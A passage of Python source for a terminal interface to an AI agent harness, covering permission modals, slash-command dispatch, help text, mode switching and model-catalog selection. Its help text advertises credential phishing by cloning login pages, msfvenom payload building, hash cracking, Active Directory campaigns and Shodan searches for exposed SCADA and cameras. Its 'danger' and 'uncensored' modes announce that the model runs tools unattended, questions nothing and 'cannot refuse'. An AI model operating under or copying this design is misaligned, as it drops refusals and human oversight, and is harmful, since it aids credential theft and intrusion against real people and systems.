    def _flush_stream(self, chat: ChatPane, palette) -> None:
        if self._stream_buf.strip():
            chat.clear_stream()
            # The finished answer, so this is the expensive half: fenced code
            # comes back highlighted and a table comes back as a real Table.
            # The live line above uses the flat text form, which is cheap
            # enough to run on every delta.
            chat.write_block(markdown_renderable(self._stream_buf, palette))
            self._stream_buf = ""

    def _flush_reasoning(self, chat: ChatPane, palette) -> None:
        """Commit in-flight reasoning to the transcript, then empty the slot.

        A no-op when the buffer is empty, which is the common case: most
        endpoints never send reasoning at all, so this is called on every turn
        and does nothing on nearly all of them.
        """
        if self._reason_buf.strip():
            chat.clear_reasoning()
            chat.write_block(R.reasoning_panel(self._reason_buf, palette))
        self._reason_buf = ""

    def _cost_line(self, ev) -> None:
        p = self.palette
        t = Text()
        t.append("  ⤷ ", style=p.dim)
        t.append(f"+{ev['input']}", style=p.dim)
        t.append(" in / ", style=p.dim)
        t.append(f"+{ev['output']}", style=p.dim)
        t.append(" out tok  ·  ", style=p.dim)
        t.append(f"${ev['cost']:.4f}", style=p.accent)
        t.append(f"  ·  {ev['model']}", style=p.dim)
        self.query_one(ChatPane).write_block(t)

    # ---- permission gate --------------------------------------------------
    async def request_permission(self, name, args, preview):
        # One modal at a time. Without the lock, /team's parallel workers could
        # each push a modal; the second would sit on top of the first and the
        # `inp.disabled = False` in whichever finishes first would re-enable the
        # prompt while a modal is still up.
        async with self._perm_lock:
            fut: asyncio.Future = asyncio.get_event_loop().create_future()
            inp = self.query_one("#input", Input)
            inp.disabled = True  # keep approval keys out of the prompt

            def _done(decision):
                inp.disabled = False
                if not fut.done():
                    fut.set_result(decision or "no")

            self.push_screen(
                PermissionModal(name, preview, self.palette,
                                radius=self._blast_radius(name, args)),
                _done,
            )
            return await fut

    def _blast_radius(self, name: str, args: dict) -> str:
        """One line naming what a gated call would touch.

        Latent by design: every shipped mode lists its gated tools in `auto` or
        `deny`, so this modal never fires today. It is correct if a mode is ever
        added that leaves a tool gated — and the same target scan is shown on
        the live tool card, which *is* reachable.
        """
        from ..sandbox import SandboxError, resolve_in_jail

        args = args or {}
        if name == "bash":
            command = args.get("command", "")
            try:
                targets = self.agent.scope.extract_targets(command)
            except Exception:
                targets = []
            if targets:
                return "targets: " + ", ".join(_dedupe(targets))
            return "no network targets named"
        path = str(args.get("path", "") or "")
        if not path:
            return ""
        try:
            resolved = resolve_in_jail(self.cfg.workdir, path, self.cfg.unsafe)
        except SandboxError as e:
            return f"REFUSED — {e}"
        exists = "exists" if resolved.exists() else "new file"
        return f"{resolved}  ({exists})"

    # ---- system lines -----------------------------------------------------
    def _sys_line(self, message: str, warn: bool = False, ok: bool = False) -> None:
        p = self.palette
        t = Text()
        if warn:
            t.append("  ⚠ ", style=f"bold {p.amber}")
            t.append(message, style=p.amber)
        elif ok:
            t.append("  ✔ ", style=f"bold {p.accent}")
            t.append(message, style=p.accent)
        else:
            t.append("  · ", style=p.dim)
            t.append(message, style=p.dim)
        self.query_one(ChatPane).write_block(t)

    # ---- slash commands ---------------------------------------------------
    #: Commands that answer even while the harness is busy. These are the ones
    #: that either report state, control a running campaign, or shut the session
    #: down — none of them starts a turn on `self.agent`, which is what makes
    #: running them mid-flight safe. Everything else is a launcher and would
    #: interleave a second turn into the transcript of the first.
    BUSY_OK = frozenset({
        "help", "cost", "scope", "mode", "model",
        "stop-hunt", "summary-hunt", "findings", "exit", "quit",
        # `report-bug-hunt` is here so its *own* refusal is the one the operator
        # reads. It cannot run mid-wave — a report built from half a wave
        # under-counts — but the gate's generic "harness is busy" points at
        # Ctrl+C, which for a hunt is the blunt key: it cancels the workers
        # rather than setting the stop flag, so the wave never unwinds and the
        # closing report is never written. The command says "stop the wave
        # first", which is the advice that actually works.
        "report-bug-hunt",
        # `ad` is here for `/ad tools` alone — "what does this box actually
        # have" is worth answering while ten agents are working, and the probe
        # starts no turn. `/ad <domain>` refuses itself when busy, so letting
        # the command through the gate cannot start a second campaign; see
        # `_cmd_ad`.
        "ad",
        # Setting a key or reading a catalog does not touch the running turn, so
        # both stay typeable mid-answer — the same reason /mode and /model do.
        "tokenharbour-api-setup", "tokenharbour-models", "zim-tokenharbour",
        "openrouter-api-setup", "zim-openrouter", "models",
        "unorouter-api-setup", "unorouter-models", "zim-unorouter",
        "aihubmix-api-setup", "aihubmix-models", "zim-aihubmix",
        "beatapi-api-setup", "beatapi-models", "zim-beatapi",
        "iteracompute-api-setup", "iteracompute-models", "zim-iteracompute",
        "infronai-api-setup", "infronai-models", "zim-infronai",
        "nvidia-api-setup", "nvidia-models", "zim-nvidia",
        "zim-antseed", "antseed-models",
        "logfare-api-setup", "logfare-models",
        # The Shodan key is a mode-600 write and a local read, like every other
        # /<source>-api-setup; it starts no turn.
        "shodan-api-setup",
        # Same again for LDXHub: the key and the catalogs are local reads and
        # a mode-600 write, and /ldxhub-models only fetches public catalogs.
        "ldxhub-api-setup", "ldxhub-models",
        # Reading an archived report back is a disk read and a write to the
        # transcript; it starts no turn and touches nothing the live one owns.
        # Useful mid-run too — while a *new* recon is cooking, the previous
        # one's tree is exactly what you want to compare against.
        "osint-tree",
        # `/effort` sets a field on the config and writes one small preference
        # file — no turn, no client rebuild — and the next request in the
        # running turn picks the new level up, which is the point of raising it
        # mid-answer. `/tokenjuice-api-setup` is a local read plus a mode-600
        # write, like every other /<source>-api-setup.
        "effort", "tokenjuice-api-setup", "tokenjuic-api-setup",
        # Reading the session's own limits is a pure read of state that is
        # already in memory, and it is most useful *during* a long turn — "is
        # this about to hit a cap" is exactly the question a running turn
        # raises. It starts no turn and touches nothing the live one owns.
        "limits",
        # Same reasoning as /rain: a display toggle reads and writes only
        # harness state, starts no turn, and is most wanted while a turn is
        # running — which is exactly when the reasoning is on screen.
        "think",
        # `/zim-opencode` hands the terminal to a *different* program and starts
        # no turn on `self.agent`, so it cannot interleave a second turn into a
        # running one. It is also the case where being able to escape a long
        # turn matters most: the whole point is to go and use another agent
        # while this one works. The TUI is suspended and restored around it, so
        # the running turn resumes exactly where it was.
        "zim-opencode",
        # The tooling probe is a `shutil.which` sweep that starts no turn, and
        # `/reverse-engineer <path> --map` is a local read of a file on this
        # disk that also starts no turn — both are worth being able to run
        # while a turn is cooking. `/reverse-engineer <path>` *does* start a
        # turn, so `_cmd_reverse_engineer` refuses itself when busy, the same
        # way `/ad` does.
        "reverse-engineer", "reverse-engineer-tools",
        # `/payload <ext> --dry-run` and `--handler` print a command and start
        # no turn, so they are worth having mid-run — reading the argv for a
        # format while another turn is cooking is exactly when you want it.
        # A real build refuses itself when busy, the same way `/ad` does.
        "payload",
    })

    def _handle_command(self, text: str) -> None:
        parts = text[1:].split()
        cmd = parts[0].lower() if parts else "help"
        args = parts[1:]
        dispatch = {
            "help": self._cmd_help,
            "clear": self._cmd_clear,
            "mode": self._cmd_mode,
            "model": self._cmd_model,
            "cost": self._cmd_cost,
            "scope": self._cmd_scope,
            "rain": self._cmd_rain,
            "think": self._cmd_think,
            "theme": self._cmd_theme,
            "save": self._cmd_save,
            "load": self._cmd_load,
            "compact": lambda a: self._cmd_compact(),
            "limits": lambda a: self._cmd_limits(),
            "team": lambda a: self._cmd_team(a),
            "osint": lambda a: self._cmd_osint(a),
            "osint-tree": lambda a: self._cmd_osint_tree(a),
            "leadgen": lambda a: self._cmd_leadgen(a),
            "shodan-api-setup": lambda a: self._cmd_shodan_key(a),
            "shodan-cam-search": lambda a: self._cmd_shodan_search("cam", a),
            "shodan-scada-search": lambda a: self._cmd_shodan_search("scada", a),
            "shodan-db-search": lambda a: self._cmd_shodan_search("db", a),
            "shodan-rdp-search": lambda a: self._cmd_shodan_search("rdp", a),
            "shodan-router-search": lambda a: self._cmd_shodan_search("router", a),
            "shodan-vuln-search": lambda a: self._cmd_shodan_search("vuln", a),
            "shodan-search": lambda a: self._cmd_shodan_search("raw", a),
            "phish": lambda a: self._cmd_phish(a),
            "payload": lambda a: self._cmd_payload(a),
            "bug-hunt": lambda a: self._cmd_bug_hunt(a),
            "scope-validator": lambda a: self._cmd_scope_validator(a),
            "ad": lambda a: self._cmd_ad(a),
            "crack": lambda a: self._cmd_crack(a),
            "obfuscate": lambda a: self._cmd_obfuscate(a),
            "stop-hunt": lambda a: self._cmd_stop_hunt(a),
            "summary-hunt": lambda a: self._cmd_summary_hunt(a),
            "findings": lambda a: self._cmd_findings(a),
            "report-bug-hunt": lambda a: self._cmd_report_bug_hunt(a),
            "panes": lambda a: self._cmd_panes(a),
            "reverse-engineer": lambda a: self._cmd_reverse_engineer(a),
            "reverse-engineer-tools": lambda a: self._cmd_reverse_engineer_tools(a),
            "zim-opencode": lambda a: self._cmd_zim_opencode(a),
            "zim-logfare": lambda a: self._cmd_zim_source("logfare", a),
            # The upstream's unlimited quota is finished for now (see
            # _cmd_tokenjuice_paused), so the switch itself is gated. The key
            # half of the old dispatch — `/zim-tokenjuice <tj_ key>` — survives
            # inside the pause: a key saved today is still the key the route
            # takes the moment it comes back.
            "zim-tokenjuice": lambda a: self._cmd_tokenjuice_paused(a),
            # Two spellings, one handler. The shipped name carries the "e" its
            # siblings have (/zim-tokenjuice, /tokenjuice-api-setup in the
            # docs); the shorter one is accepted because it was asked for by
            # that name and a mistyped command should not read as missing.
            "tokenjuice-api-setup": lambda a: self._cmd_tokenjuice_key(a),
            "tokenjuic-api-setup": lambda a: self._cmd_tokenjuice_key(a),
            "effort": lambda a: self._cmd_effort(a),
            "zim-tokenharbour": lambda a: self._cmd_zim_tokenharbour(a),
            "zim-openrouter": lambda a: self._cmd_zim_gateway("openrouter"),
            "zim-antseed": lambda a: self._cmd_zim_gateway("antseed"),
            "zim-source": lambda a: self._cmd_zim_source(None),
            "tokenharbour-api-setup": lambda a: self._cmd_tokenharbour_key(a),
            "tokenharbour-models": lambda a: self._cmd_tokenharbour_models(a),
            "openrouter-api-setup": lambda a: self._cmd_gateway_key("openrouter", a),
            "zim-unorouter": lambda a: self._cmd_zim_gateway("unorouter"),
            "unorouter-api-setup": lambda a: self._cmd_gateway_key("unorouter", a),
            "unorouter-models": lambda a: self._cmd_models(["unorouter"]),
            "zim-aihubmix": lambda a: self._cmd_zim_gateway("aihubmix"),
            "aihubmix-api-setup": lambda a: self._cmd_gateway_key("aihubmix", a),
            "aihubmix-models": lambda a: self._cmd_models(["aihubmix"]),
            "zim-beatapi": lambda a: self._cmd_zim_gateway("beatapi"),
            "beatapi-api-setup": lambda a: self._cmd_gateway_key("beatapi", a),
            "beatapi-models": lambda a: self._cmd_models(["beatapi"]),
            "zim-iteracompute": lambda a: self._cmd_zim_source("iteracompute", a),
            "iteracompute-api-setup": lambda a: self._cmd_gateway_key(
                "iteracompute", a),
            "iteracompute-models": lambda a: self._cmd_models(["iteracompute"]),
            "zim-infronai": lambda a: self._cmd_zim_source("infronai", a),
            "infronai-api-setup": lambda a: self._cmd_gateway_key(
                "infronai", a),
            "infronai-models": lambda a: self._cmd_models(["infronai"]),
            "zim-nvidia": lambda a: self._cmd_zim_source("nvidia", a),
            "nvidia-api-setup": lambda a: self._cmd_gateway_key("nvidia", a),
            "nvidia-models": lambda a: self._cmd_models(["nvidia"]),
            "protocol": lambda a: self._cmd_protocol(a),
            "openai-endpoint": lambda a: self._cmd_openai_endpoint(a),
            "antseed-models": lambda a: self._cmd_models(["antseed"]),
            "models": lambda a: self._cmd_models(a),
            "logfare-api-setup": lambda a: self._cmd_logfare_key(a),
            "logfare-models": lambda a: self._cmd_logfare_models(a),
            "ldxhub-api-setup": lambda a: self._cmd_ldxhub_key(a),
            "ldxhub-models": lambda a: self._cmd_ldxhub_models(a),
            "exit": lambda a: self.exit(),
            "quit": lambda a: self.exit(),
        }
        fn = dispatch.get(cmd)
        if fn is None:
            self._sys_line(f"unknown command: /{cmd}  — try /help", warn=True)
            return
        # The gate lives here rather than in _on_submit so a busy-permitted
        # command can still be dispatched while a run is cooking. See BUSY_OK.
        if self.busy and cmd not in self.BUSY_OK:
            self._sys_line("harness is busy — Ctrl+C to interrupt", warn=True)
            return
        fn(args)

    def _cmd_help(self, args=None) -> None:
        p = self.palette
        rows = [
            ("/help", "this help"),
            ("/mode [name]", "switch mode: auto | edits | plan | zim | danger | uncensored"),
            ("/clear", "wipe the transcript and conversation history"),
            ("/model [name]", "show or switch the model"),
            ("/cost", "session token and cost breakdown"),
            ("/scope", "show allow.yaml / out-of-scope.yaml status"),
            ("/rain", "toggle the matrix-rain background"),
            ("/think", "toggle showing the model's own reasoning"),
            ("/effort [low|medium|high|off]", "raise or lower how hard the model thinks"),
            ("/theme green|amber|cyan|system", "switch the color theme"),
            ("/zim-logfare", "switch upstream to Logfare (bundled proxy, all models)"),
            ("/zim-tokenjuice", "Token Juice — unlimited quota paused, back in a few days"),
            ("/tokenjuice-api-setup [key|clear]", "your own tj_ key — or fall back to the shared one"),
            ("/zim-tokenharbour", "switch upstream to TokenHarbour (hosted)"),
            ("/zim-openrouter", "switch upstream to OpenRouter   (hosted)"),
            ("/zim-unorouter", "switch upstream to UnoRouter    (hosted, free models)"),
            ("/zim-aihubmix", "switch upstream to AIHubMix     (hosted, free models)"),
            ("/zim-beatapi", "switch upstream to BeatAPI      (hosted, free models)"),
            ("/zim-iteracompute [proxy]", "switch upstream to IteraCompute (direct; `proxy` to go via :4002)"),
            ("/zim-infronai [proxy]", "switch upstream to InfronAI (direct; `proxy` to go via :4003)"),
            ("/zim-nvidia", "switch upstream to NVIDIA NIM (direct, free dev tier)"),
            ("/zim-antseed", "switch upstream to AntSeed (local buyer, free peers)"),
            ("/zim-source", "show upstream sources and their status"),
            ("/protocol [auto|anthropic|openai]", "which wire protocol the endpoint speaks"),
            ("/openai-endpoint <url> [model]", "talk Chat Completions to any OpenAI-compatible endpoint"),
            ("/tokenharbour-api-setup <key>", "store your TokenHarbour API key"),
            ("/tokenharbour-models", "fetch the live catalog; show what is free"),
            ("/openrouter-api-setup [key]", "store your OpenRouter API key (optional)"),
            ("/unorouter-api-setup [key]", "store your UnoRouter API key (optional)"),
            ("/unorouter-models", "the live free catalog — what is free and usable"),
            ("/aihubmix-api-setup [key]", "store your AIHubMix API key (optional)"),
            ("/aihubmix-models", "the live free catalog — what is free and usable"),
            ("/beatapi-api-setup [key]", "store your BeatAPI API key (optional)"),
            ("/beatapi-models", "the live free catalog — what is free and usable"),
            ("/iteracompute-api-setup [key]", "store your IteraCompute API key"),
            ("/iteracompute-models", "the live free catalog — what is free and usable"),
            ("/infronai-api-setup [key]", "store your InfronAI API key"),
            ("/infronai-models", "the live free catalog — what is free and usable"),
            ("/nvidia-api-setup [key]", "store your NVIDIA API key (free developer tier)"),
            ("/nvidia-models", "the live catalog — what this harness can drive"),
            ("/antseed-models", "AntSeed's free models, and the peer to pin"),
            ("/models", "free models of an upstream — /models [source]"),
            ("/logfare-api-setup [key]", "use your own Logfare key (the shipped one is shared)"),
            ("/logfare-models", "fetch the live catalog; show what is up"),
            ("/ldxhub-api-setup [key]", "store your LDXHub API key (document jobs)"),
            ("/ldxhub-models [service]", "LDXHub models/engines — pick the default per service"),
            ("/reverse-engineer <file>", "map an artifact, then choose what to change"),
            ("/reverse-engineer <file> --map", "map it only — no model turn, nothing sent"),
            ("/reverse-engineer-tools [kind]", "RE tooling: what is here, what is missing"),
            ("/panes", "re-open this session under tmux — ctrl+b h/v split"),
            ("/zim-opencode", "open opencode behind a fresh rotating IP"),
            ("/save [name]", "write the session to disk"),
            ("/load [name]", "restore a saved session"),
            ("/compact", "summarise history to free context"),
            ("/limits", "context window, round caps, timeouts — and where each comes from"),
            ("/team <task>", "fan the task out across parallel agents"),
            ("/osint [kind] <target>", "open-source recon — email, phone, socials"),
            ("/osint-tree [kind|path]", "re-show a finished recon as a result tree"),
            ("/leadgen <niche> <location>", "passive local lead gen — audit, drafts, never sends"),
            ("/shodan-api-setup <key>", "store your Shodan API key"),
            ("/shodan-cam-search [cc]", "exposed IP cameras, then analyse the result"),
            ("/shodan-scada-search [cc]", "exposed ICS / SCADA (PLCs, RTUs, HMIs)"),
            ("/shodan-db-search [cc]", "exposed databases — Mongo, ES, Redis, SQL"),
            ("/shodan-rdp-search [cc]", "exposed RDP and VNC services"),
            ("/shodan-router-search [cc]", "exposed routers, firewalls and VPNs"),
            ("/shodan-vuln-search <q>", "hosts Shodan flagged with a known CVE"),
            ("/shodan-search <query>", "run any Shodan query verbatim, then analyse"),
            ("/phish <host>", "clone a login page, serve it, harvest creds"),
            ("/payload <ext>", "analyse an extension, build a payload, print the listener"),
            ("/payload <ext> --dry-run", "print the exact msfvenom command, build nothing"),
            ("/payload <ext> --handler", "the msfconsole listener only"),
            ("/scope-validator", "paste a programme overview → allow.yaml, out-of-scope.yaml, ranked targets"),
            ("/bug-hunt <target>", "recon, then one wave of 10 agents"),
            ("/bug-hunt <target> --wave N", "run wave N specifically"),
            ("/ad <domain> --ack <domain>", "AD campaign — gated, interlocks on"),
            ("/ad tools", "what AD tooling this host actually has"),
            ("/crack <file|dir>", "crack hashes offline — CPU only, budgeted"),
            ("/crack <file|dir> --deep", "add the rule set that takes hours"),
            ("/stop-hunt", "end a running hunt       (works while busy)"),
            ("/summary-hunt", "the hunt report          (works while busy)"),
            ("/report-bug-hunt", "evidence-only report, every wave"),
            ("/findings", "the finding tracker      (works while busy)"),
            ("/exit", "leave the harness        (Ctrl+D also works)"),
        ]
        t = Text()
        t.append("  COMMANDS\n\n", style=f"bold {p.accent}")
        for name, desc in rows:
            t.append(f"  {name:<24}", style=f"bold {p.primary}")
            t.append(desc + "\n", style=p.dim)
        t.append("\n  MODES\n\n", style=f"bold {p.accent}")
        for name, spec in MODES.items():
            mstyle = f"bold {p.red}" if spec.get("loud") else f"bold {p.primary}"
            t.append(f"  {name:<10}", style=mstyle)
            t.append(spec["blurb"] + "\n", style=p.dim)
        t.append("\n  MENTIONS  ", style=f"bold {p.accent}")
        t.append("@path attaches a file's contents   ·   type / or @ for the popup\n", style=p.dim)
        t.append("  KEYS  ", style=f"bold {p.accent}")
        t.append("↑↓ select · Tab accept · Esc close · Ctrl+C interrupt · Ctrl+D exit\n", style=p.dim)
        self.query_one(ChatPane).write_block(t)

    def _cmd_mode(self, args) -> None:
        p = self.palette
        if not args:
            t = Text()
            t.append("  AGENT MODE\n\n", style=f"bold {p.accent}")
            for name, spec in MODES.items():
                active = name == self.cfg.mode
                mark = "◉" if active else "○"
                if active and spec.get("loud"):
                    style = f"bold white on {p.red}"
                elif active:
                    style = f"bold {p.accent}"
                else:
                    style = p.primary
                t.append(f"  {mark} {name:<8}", style=style)
                t.append(spec["blurb"] + "\n", style=p.dim)
            if self.cfg.mode == "zim":
                src = self.cfg.agents_path or "(AGENTS.md not found)"
                t.append("\n  following  ", style=p.dim)
                t.append(str(src) + "\n", style=p.primary)
            t.append("\n  usage: /mode <name>\n", style=p.dim)
            self.query_one(ChatPane).write_block(t)
            return
        name = args[0].lower()
        if name not in MODES:
            self._sys_line(
                f"unknown mode: {name} — try " + " | ".join(MODES), warn=True
            )
            return
        self._set_mode(name)

    def _set_mode(self, name: str) -> None:
        self.cfg.mode = name
        self.agent.set_mode(name)
        self.query_one(HeaderBar).set_mode(name)
        if name == "zim":
            # Re-resolve rather than trusting the launch-time value: a session
            # started in one directory and switched to zim from another (or
            # launched before the doctrine was installed) would otherwise arm
            # with no file at all. An explicit --agents path is never overridden.
            if self.cfg.agents_path is None or not Path(self.cfg.agents_path).is_file():
                found = find_agents_file(self.cfg.workdir, self.cfg.state_dir)
                if found is not None:
                    self.cfg.agents_path = found
            src = self.cfg.agents_path
            if src:
                self._sys_line(f"ZIM MODE ARMED — following {src} · full auto", warn=True)
            else:
                self._sys_line(
                    "ZIM MODE ARMED — no AGENTS.md found (set --agents PATH)", warn=True
                )
        elif name == "danger":
            self._sys_line(
                "DANGER MODE ARMED — every tool runs unattended and the "
                "operator's word is law; nothing is questioned",
                warn=True,
            )
        elif name == "uncensored":
            self._sys_line(
                "UNCENSORED MODE ARMED — the default prompt is gone; the "
                "model cannot refuse and will only think how to do it",
                warn=True,
            )
        else:
            self._sys_line(f"mode → {MODES[name]['label']} ({MODES[name]['blurb']})", ok=True)

    def _cmd_clear(self, args=None) -> None:
        self.query_one(ChatPane).clear()
        self.agent.clear()
        tele = self._telemetry_rail()
        if tele is not None:
            tele.clear_files()
        loop = self._loop_rail()
        if loop is not None:
            loop.trail.clear()
            loop.set_stage("idle")
            loop.set_counters(0, 0)
        self._last_output_tokens = 0
        self._last_call_input = 0
        self._sync_rails()
        self._splash()
        self._sys_line("transcript and history cleared", ok=True)

    def _cmd_model(self, args) -> None:
        p = self.palette
        # Offer only what the active upstream actually serves — Logfare and
        # Token Juice have very different catalogs, and a model the upstream
        # does not know is a 404 at request time, not a switch.
        active = sources_mod.active_key(self.cfg.base_url)
        models = sources_mod.models_for(self.cfg.base_url) or tuple(KNOWN_MODELS)
        # TokenHarbour's catalog is fetched, so it also carries prices and a
        # free flag the other sources have no equivalent of. Read once, here.
        th_catalog = (th_mod.cached_models()
                      if active == "tokenharbour" else None)
        # AntSeed's is fetched too, and is the one catalog whose *ids are not
        # what you type*: a free model is reached by pinning it to a seller, so
        # the switchable name is `<peerId>@<model>`. Read once here, for the same
        # reason as the others — the fetch is the slow part and this is a render.
        as_catalog = (as_mod.cached_models()
                      if active == "antseed" else None)
        # UnoRouter's is fetched as well, and is read once here for the same
        # reason: the fetch is the slow part and this is a render.
        uno_catalog = (uno_mod.cached_models()
                       if active == "unorouter" else None)
        # AIHubMix's is fetched too. Read once here for the same reason as the
        # others: the fetch is the slow part and this is a render.
        ah_catalog = (ah_mod.cached_models()
                      if active == "aihubmix" else None)
        # BeatAPI's is fetched too, and is read once here for the same reason as
        # the others: the fetch is the slow part and this is a render.
        bp_catalog = (bp_mod.cached_models()
                      if active == "beatapi" else None)
        # IteraCompute's is fetched as well, and is read once here for the same
        # reason as the others: the fetch is the slow part and this is a render.
        ic_catalog = (ic_mod.cached_models()
                      if active == "iteracompute" else None)
        # InfronAI's, on the same terms.
        inf_catalog = (inf_mod.cached_models()
                       if active == "infronai" else None)
        # NVIDIA's too. Every entry is free on the developer tier and the
        # catalog publishes no price, so this is what makes /model say "free"
        # instead of billing a model at DEFAULT_PRICE.
        nv_catalog = (nv_mod.cached_models()
                      if active == "nvidia" else None)
        # Logfare's is fetched too, and carries per-model health. Read once for
        # the same reason: the fetch is the slow part and this is a render.
        lf_catalog = sources_mod.catalog_for(self.cfg.base_url)

        if not args:
            t = Text()
            t.append("  current model: ", style=p.dim)
            t.append(self.cfg.display_model + "\n", style=f"bold {p.accent}")
            if active:
                src = sources_mod.discover().get(active)
                hosted = {"tokenharbour": "TokenHarbour", "openrouter": "OpenRouter",
                          "unorouter": "UnoRouter", "aihubmix": "AIHubMix",
                          "beatapi": "BeatAPI", "antseed": "AntSeed"}
                label = src.label if src else hosted.get(active, active)
                t.append("  source: ", style=p.dim)
                t.append(label, style=p.dim)
                t.append(f"   ·   {self.cfg.base_url}\n", style=p.dim)
            t.append("\n", style=p.dim)
            # Free first, then the rest. A hosted gateway's list is long and
            # changes; the operator almost always wants the free ones, so they
            # lead — with the model in use never hidden, whatever it costs.
            order = self._model_display_order(
                models,
                th_catalog or as_catalog or uno_catalog or ah_catalog
                or bp_catalog or ic_catalog or inf_catalog or nv_catalog)
            for m in order:
                mark = "◉" if m == self.cfg.model else "○"
                style = f"bold {p.accent}" if m == self.cfg.model else p.primary
                # AntSeed's list is of *models*, but what is typed is a pinned
                # id. Show the pin for the free ones, since that is the string
                # that works — the bare name 502s against the trust floor.
                shown = m
                if active == "antseed" and as_catalog:
                    for _m in as_catalog:
                        if _m.id == m and _m.free:
                            shown = _m.pin() or m
                            break
                t.append(f"  {mark} {shown:<26}", style=style)
                note = self._model_note(m, th_catalog, lf_catalog, as_catalog,
                                        uno_catalog, bp_catalog, ic_catalog,
                                        inf_catalog, nv_catalog)
                t.append(note + "\n", style=p.dim)
            t.append("\n  usage: /model <name>\n", style=p.dim)
            # Say how current the list is, not merely that one exists. A cache
            # filled at startup and a cache filled a second ago read identically
            # in the transcript, and only one of them is worth trusting — so
            # each of these names the age and its refresh command. The age is
            # read from the module rather than assumed from the list being
            # non-empty, which is what let a three-hour-old catalog be called
            # "live".
            if active == "antseed":
                t.append(
                    f"  catalog {_catalog_clause(as_mod.catalog_age(), as_mod.CACHE_TTL)}"
                    " — /antseed-models shows the free\nones and the seller to "
                    "pin; pinning is what makes a free model actually route\n",
                    style=p.dim)
            elif active == "tokenharbour":
                t.append(
                    f"  catalog {_catalog_clause(th_mod.catalog_age(), th_mod.CACHE_TTL)}"
                    " — /tokenharbour-models refetches it\n", style=p.dim)
            elif active == "logfare":
                t.append(
                    f"  catalog {_catalog_clause(lf_mod.catalog_age(), lf_mod.CACHE_TTL)}"
                    " — /logfare-models refetches it\n", style=p.dim)
            elif active == "unorouter":
                t.append(
                    f"  catalog {_catalog_clause(uno_mod.catalog_age(), uno_mod.CACHE_TTL)}"
                    " — /unorouter-models shows the free\nones; free models are "
                    "listed first, and a paid one is priced by estimate\n",
                    style=p.dim)
            elif active == "aihubmix":
                t.append(
                    f"  catalog {_catalog_clause(ah_mod.catalog_age(), ah_mod.CACHE_TTL)}"
                    " — /aihubmix-models shows the free\nones; free models are "
                    "listed first. Free means priced 0/0, which is\n"
                    "  narrower than the -free suffix suggests\n",
                    style=p.dim)
            elif active == "beatapi":
                t.append(
                    f"  catalog {_catalog_clause(bp_mod.catalog_age(), bp_mod.CACHE_TTL)}"
                    " — /beatapi-models shows the free\nones; free models are "
                    "listed first. The free ids are\n"
                    "  limited-time and rate limited — they move\n",
                    style=p.dim)
            elif active == "iteracompute":
                t.append(
                    f"  catalog {_catalog_clause(ic_mod.catalog_age(), ic_mod.CACHE_TTL)}"
                    " — /iteracompute-models shows the\nfree ones; free models "
                    "are listed first. The free tier is\n"
                    "  a monthly token allowance on one model\n",
                    style=p.dim)
            elif active == "infronai":
                t.append(
                    f"  catalog {_catalog_clause(inf_mod.catalog_age(), inf_mod.CACHE_TTL)}"
                    " — /infronai-models shows the\nfree ones; free models are "
                    "listed first. Free means priced 0/0 or a\n"
                    "  :free suffix, and a free account still needs a $5 "
                    "balance\n",
                    style=p.dim)
            elif active == "nvidia":
                t.append(
                    f"  catalog {_catalog_clause(nv_mod.catalog_age(), nv_mod.CACHE_TTL)}"
                    " — /nvidia-models shows the\nchat models; free means the "
                    "developer tier, not a per-model\n"
                    "  price. The catalog lists more than the account can call\n",
                    style=p.dim)
            self.query_one(ChatPane).write_block(t)
            return
        name = args[0]
        # Every hosted gateway's list is FETCHED, so a cold cache leaves `models`
        # as the Logfare fallback — and the check below would then reject a model
        # the gateway genuinely serves, against a list from a different provider.
        # Fetch it here instead: this is an explicit switch, so one network
        # round-trip is the right price for a correct answer.
        #
        # This branch used to be TokenHarbour's alone, which is exactly how the
        # bug got in: the fix was written for the first gateway that needed it
        # and every gateway added afterwards silently inherited the Logfare list.
        # Measured on OpenRouter — `/model dots-studio/dots-3-note-preview:free`
        # was refused as "not served by openrouter" while it was the first row of
        # `/models openrouter`, and the session was then left on the Logfare
        # default and 402'd on the next turn. A wrong list is worse than no list.
        #
        # OpenRouter needs no credential for this and TokenHarbour does, so the
        # key is optional here rather than required.
        # A pinned id — `<peerId>@<model>` — is accepted by the gateway but is
        # not in the catalog's id list, so it is unwrapped to its model before
        # the membership test. Without this, every free AntSeed model would be
        # refused by the very check that exists to catch typos.
        check_name = name.split("@", 1)[1] if (active == "antseed" and "@" in name) else name
        # Logfare is in this tuple for the same reason as the others, and its
        # absence was the same bug a third time: its list is FETCHED, so with a
        # cold or expired cache `models` is the hardcoded KNOWN_MODELS fallback,
        # and a model Logfare serves right now gets refused as "not served by
        # logfare" against a list that is not Logfare's. Measured on this box:
        # `mimo-v2.6-flash` was live, absent from KNOWN_MODELS, and refused.
        #
        # It is also the source the operator is most likely to be on, so the
        # wrong answer was the common case rather than the corner.
        if active in ("tokenharbour", "openrouter", "unorouter", "antseed",
                      "logfare", "aihubmix", "beatapi",
                      "iteracompute", "infronai", "nvidia") and (
                models is None or check_name not in models):
            fetched = None
            if active == "tokenharbour":
                if th_catalog is None:
                    creds = th_mod.load_credentials()
                    if creds is not None:
                        fetched, _ = th_mod.fetch_models(creds[0])
                else:
                    fetched = list(th_catalog)
            elif active == "openrouter":
                creds = or_mod.load_credentials()
                fetched, _ = or_mod.fetch_models(creds[0] if creds else "")
            elif active == "unorouter":
                # Keyless like OpenRouter's: the catalog is public. Fetched
                # rather than read from the cache when the cache is cold or
                # expired, so a live model is not refused against a stale list.
                if uno_catalog is None:
                    creds = uno_mod.load_credentials()
                    fetched, _ = uno_mod.fetch_models(creds[0] if creds else "")
                else:
                    fetched = list(uno_catalog)
            elif active == "antseed":
                if as_catalog is None:
                    fetched, _ = as_mod.fetch_models()
                else:
                    fetched = list(as_catalog)
            elif active == "aihubmix":
                # Keyless like OpenRouter's and UnoRouter's: /api/v1/models
                # answers with no credential. Fetched rather than read from the
                # cache when the cache is cold or expired, so a live model is
                # not refused against a stale list.
                if ah_catalog is None:
                    creds = ah_mod.load_credentials()
                    fetched, _ = ah_mod.fetch_models(creds[0] if creds else "")
                else:
                    fetched = list(ah_catalog)
            elif active == "beatapi":
                # Keyless like the others: /v1/text/models answers with no
                # credential. Fetched rather than read from the cache when the
                # cache is cold or expired, so a live model is not refused
                # against a stale list.
                if bp_catalog is None:
                    creds = bp_mod.load_credentials()
                    fetched, _ = bp_mod.fetch_models(creds[0] if creds else "")
                else:
                    fetched = list(bp_catalog)
            elif active == "iteracompute":
                # Keyless as well: the Models endpoint is public. Fetched rather
                # than read from the cache when the cache is cold or expired, so
                # a live model is not refused against a stale list.
